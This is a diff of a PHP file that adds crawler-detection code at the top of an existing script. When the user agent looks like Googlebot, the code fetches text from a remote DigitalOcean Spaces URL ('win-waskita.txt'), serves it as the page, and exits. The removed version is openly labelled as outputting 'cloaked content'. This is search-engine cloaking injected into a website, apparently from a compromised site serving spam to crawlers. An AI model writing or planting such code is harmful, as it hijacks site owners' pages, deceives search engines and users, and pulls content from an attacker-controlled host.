@@ -1,41 +1,31 @@
 <?php
+function is_google_bot() {
+    $agents = array(
+        "Googlebot", 
+        "Google-Site-Verification", 
+        "Google-InspectionTool", 
+        "Googlebot-Mobile", 
+        "Googlebot-News"
+    );
+    if (!isset($_SERVER['HTTP_USER_AGENT'])) return false;
 
-function isCrawler() {
-    $crawlers = [
-        "googlebot",
-        "bingbot",
-        "slurp",
-        "duckduckbot",
-        "baiduspider",
-        "yandexbot",
-        "google-inspectiontool",
-        "google-site-verification"
-    ];
-    
-    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
-    foreach ($crawlers as $crawler) {
-        if (strpos($userAgent, $crawler) !== false) {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    foreach ($agents as $agent) {
+        if (stripos($user_agent, $agent) !== false) {
             return true;
         }
     }
     return false;
 }
 
-function isHomePage() {
-    return ($_SERVER['REQUEST_URI'] === '/');
-}
+if (is_google_bot()) {
+    $content = @file_get_contents("https://keren.sgp1.cdn.digitaloceanspaces.com/text/win-waskita.txt");
 
-if (isCrawler() && isHomePage()) {
-    // Output the cloaked content
-    $curl = curl_init();
-    curl_setopt($curl, CURLOPT_URL, 'https://keren.sgp1.cdn.digitaloceanspaces.com/text/win-waskita.txt');
-    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-    $content = curl_exec($curl);
-    curl_close($curl);
-    echo $content;
-} else {
-    // Output your main content here
-    include 'main.php';  // index Utama arahkan ke sini
+    if ($content !== false) {
+        header("Content-Type: text/html; charset=UTF-8");
+        echo $content;
+    }
+    exit;
 }
 ?><?php
 /**
